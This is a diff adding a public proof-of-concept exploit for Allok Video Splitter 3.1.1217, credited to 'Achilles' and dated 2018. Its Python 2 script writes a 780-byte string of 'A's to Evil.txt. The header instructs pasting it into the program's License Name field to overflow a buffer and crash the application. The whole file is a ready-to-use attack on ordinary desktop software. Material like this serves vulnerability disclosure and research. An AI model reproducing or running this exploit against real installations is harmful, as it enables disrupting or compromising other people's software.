@@ -1,0 +1,23 @@
+###########################################################################################
+# Exploit Title: Allok Video Splitter 3.1.1217
+# Date: 2018-05-09
+# Exploit Author: Achilles
+# Vendor Homepage: http://www.alloksoft.com/
+# Vulnerable Software: http://www.alloksoft.com/allok_vsplitter.exe
+# Tested on OS: Windows 7 64-bit DE
+# Steps to reproduce: Copy the contents of the file (Evil.txt)
+# and paste in the License Name field click Register and BOOM
+###########################################################################################
+
+#!/usr/bin/python
+  
+buffer = "A" * 780
+  
+try:
+    f=open("Evil.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(buffer)
+    f.write(buffer)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
